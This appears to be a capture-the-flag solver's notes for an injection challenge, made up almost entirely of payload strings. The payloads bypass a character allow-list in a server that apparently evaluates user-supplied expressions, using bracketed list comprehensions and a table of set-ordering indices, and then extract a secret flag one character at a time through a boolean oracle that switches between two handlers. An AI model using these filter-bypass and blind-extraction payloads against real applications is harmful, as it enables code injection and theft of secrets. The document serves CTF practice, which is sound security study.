ping_handler114514
load_flag_handler114514
fib_handler1145141

session[args[0]]114514log
session[args[0]][100]114514log
session[args[0]][args[0][0]]114514log

## Part 1

# Relevant varaible taken from server code:
valid_event_chars = set('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_0123456789[]')

# Code for conversion of set to list as list comprehension
[c for c in valid_event_chars]

# Exploit variant:
[[c][0]for[c]in[valid_event_chars][0]][n] # Note: n is the nth charachter in valid_event_chars set converted to a list (ORDER IS DIFFERENT!)

n c
0 1
1 0
2 3
3 2
4 5
5 4
6 7
7 6
8 9
9 8
10 A
11 C
12 B
13 E
14 D
15 G
16 F
17 I
18 H
19 K
20 J
21 M
22 L
23 O
24 N
25 Q
26 P
27 S
28 R
29 U
30 T
31 W
32 V
33 Y
34 X
35 [
36 Z
37 ]
38 _
39 a
40 c
41 b
42 e
43 d
44 g
45 f
46 i
47 h
48 k
49 j
50 m
51 l
52 o
53 n
54 q
55 p
56 s
57 r
58 u
59 t
60 w
61 v
62 y
63 x
64 z


## Part 2

# Idiomatic code:
# Note: session['log'] is the flag
character in session['log'] or fib_handler

# Exploit variant:
[args[0]][0]in[session[args[0]]][0][n]or[load_flag_handler][0] # Note: n is the nth character of the flag
# Note: [args[0]][0] is a placeholder for the exploit in part 1


## Part 3

# To test for the character 'c' in the flag (should be the first one):

[[c][0]for[c]in[valid_event_chars][0]][x]in[session[args[0]]][0][y]or[fib_handler][0]114514log
# x = char in set
# y = position in flag

[[c][0]for[c]in[valid_event_chars][0]][40]in[session[args[0]][1]][0][0]or[load_flag_handler][0]114514log
[[c][0]for[c]in[valid_event_chars][0]][41]in[session[args[0]][1]][0][0]or[load_flag_handler][0]114514log
